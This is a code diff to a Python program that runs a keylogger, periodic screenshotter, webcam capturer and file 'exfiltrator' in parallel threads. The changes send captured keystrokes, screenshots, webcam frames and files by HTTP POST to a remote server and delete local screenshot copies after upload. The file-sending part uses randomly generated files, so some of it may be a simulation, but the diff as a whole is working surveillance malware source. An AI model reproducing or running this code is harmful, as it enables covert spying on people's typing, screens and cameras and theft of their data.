@@ -6,6 +6,7 @@ from PIL import ImageGrab
 from threading import Thread
 import os, io
 import random
+from loguru import logger
 
 import cv2, time
 
@@ -43,28 +44,18 @@ class Keylogger:
         end_date_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "-")
         self.filename = f"./keylogs/keylog-{start_date_str}__{end_date_str}"
 
-    def report_to_file(self):
-        directory = os.path.dirname(self.filename)
-        if not os.path.exists(directory):
-            os.makedirs(directory)
-        with open(f"{self.filename}.txt", "w") as f:
-            print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
-
     def report_to_server(self):
         try:
             response = requests.post(SERVER_URL + "/api/keylog", data={'log': self.log})
-            print("Log sent to server..." + response.text)
+            logger.info("Log sent to server..." + response.text)
         except Exception as e:
-            print(f"Error sending log: {e}")
+            logger.error(f"Error sending log: {e}")
 
     def report(self):
         if self.log:
             self.end_dt = datetime.datetime.now()
             self.update_filename()
-            # self.report_to_file()
             self.report_to_server()
-            print("Keylogger report at: ", self.filename)
             self.start_dt = datetime.datetime.now()
 
         self.log = ""
@@ -76,7 +67,7 @@ class Keylogger:
         self.start_dt = datetime.datetime.now()
         keyboard.on_release(callback=self.callback)
         self.report()
-        print("Keylogger started...")
+        logger.debug("Keylogger started...")
         keyboard.wait()
 
 class Screenshotter:
@@ -92,16 +83,24 @@ class Screenshotter:
         if not os.path.exists(directory):
             os.makedirs(directory)
         pic.save(filename)
-        print(f"[+] Screenshot saved: {filename}")
+        logger.info(f"Screenshot saved: {filename}")
         self.send_screenshot_to_server(pic)
+        self.delete_screenshot(filename)
         self.screenshot_count += 1
 
         timer = Timer(interval=self.interval, function=self.screenshot)
         timer.daemon = True
         timer.start()
 
+    def delete_screenshot(self, filename):
+        try:
+            os.remove(filename)
+        except:
+            pass
+        logger.info("Screenshot deleted...")
+
     def send_screenshot_to_server(self, pic):
-        print("Sending screenshot to server...")
+        logger.info("Sending screenshot to server...")
         #convert pic to bytes
         imgByteArr = io.BytesIO()
         pic.save(imgByteArr, format='PNG')
@@ -110,12 +109,12 @@ class Screenshotter:
         files = {'file': ('screenshot.png', imgByteArr, 'image/png', {'Expires': '0'})}
         try:
             response = requests.post(SERVER_URL + "/api/screenshot", files=files)
-            print(response.text)
+            logger.info("Screenshot sent to server..." + response.text)
         except Exception as e:
-            print(f"Error sending screenshot: {e}")
+            logger.error(f"Error sending screenshot: {e}")
 
     def start(self):
-        print("Screenshotter started...")
+        logger.debug("Screenshotter started...")
         self.screenshot()
 
 class Exfiltrator:
@@ -125,11 +124,20 @@ class Exfiltrator:
 
     def exfiltrate(self):
         # exfiltrate data to server
-        print("Generating random file...")
+        logger.info("Generating random file...")
         #size between 10 and 100
         size = random.randint(10, 100)
         self.generate_random_file("./files/random_file", size)
-        print("Exfiltrating data to server...")
+        logger.info("Sending file to server...")
+
+        files = {'file': open('./files/random_file', 'rb')}
+        try:
+            response = requests.post(SERVER_URL + "/api/files", files=files)
+            logger.info("File sent to server..." + response.text)
+        except Exception as e:
+            logger.error(f"Error sending file: {e}")
+
+
         timer = Timer(interval=self.interval, function=self.exfiltrate)
         timer.daemon = True
         timer.start()
@@ -147,31 +155,30 @@ class Exfiltrator:
             os.remove(filename)
         except:
             pass
-        print("Random file deleted...")
+        logger.info("Random file deleted...")
 
     def delete(self):
-        print("Deleting random file...")
+        logger.info("Deleting random file...")
         self.delete_random_file("./files/random_file") 
         timer = Timer(interval=(self.interval/2), function=self.delete)
         timer.daemon = True
         timer.start()
 
     def start(self):
-        print("Exfiltrator started...")
+        logger.debug("Exfiltrator started...")
         self.exfiltrate()
         # self.delete()
-
 
 class Webcam:
     def __init__(self, interval):
         self.interval = interval
 
     def start(self):
-        print("Webcam started...")
+        logger.debug("Webcam started...")
         self.capture()
 
     def capture(self):
-        print("Opening camera during 20 seconds...")
+        logger.info("Capturing frame...")
         cap = cv2.VideoCapture(0)
         start_time = time.time()
         while( int(time.time() - start_time) < 20 ):
@@ -182,20 +189,21 @@ class Webcam:
             time.sleep(0.1)
 
         cap.release()
-        print("Camera closed...")
+        cv2.destroyAllWindows()
+        logger.info("Frame captured...")
         timer = Timer(interval=self.interval, function=self.capture)
         timer.daemon = True
         timer.start()
 
     def send_frame_to_server(self, frame):
-        print("Sending frame to server...")
+        logger.info("Sending frame to server...")
         _, encoded_image = cv2.imencode('.jpg', frame)
         files = {'file': ('image.jpg', encoded_image, 'image/jpeg', {'Expires': '0'})}
         try:
             response = requests.post(SERVER_URL + "/api/webcam", files=files)
-            print(response.text)
+            logger.info("Frame sent to server..." + response.text)
         except Exception as e:
-            print(f"Error sending frame: {e}")
+            logger.error(f"Error sending frame: {e}")
 
 
 if __name__ == "__main__":
@@ -206,13 +214,13 @@ if __name__ == "__main__":
 
     # Create threads for keylogger and screenshotter
     keylogger_thread = Thread(target=keylogger.start)
-    print("Keylogger thread created...")
+    logger.warning("Keylogger thread created...")
     screenshotter_thread = Thread(target=screenshotter.start)
-    print("Screenshotter thread created...")
+    logger.warning("Screenshotter thread created...")
     exfiltrator_thread = Thread(target=exfiltrator.start)
-    print("Exfiltrator thread created...")
+    logger.warning("Exfiltrator thread created...")
     webcam_thread = Thread(target=webcam.start)
-    print("Webcam thread created...")
+    logger.warning("Webcam thread created...")
 
     # Start threads
     keylogger_thread.start()
@@ -225,4 +233,4 @@ if __name__ == "__main__":
     exfiltrator_thread.join()
     webcam_thread.join()
 
-    print("Program started...")
+    logger.critical("Program started...")
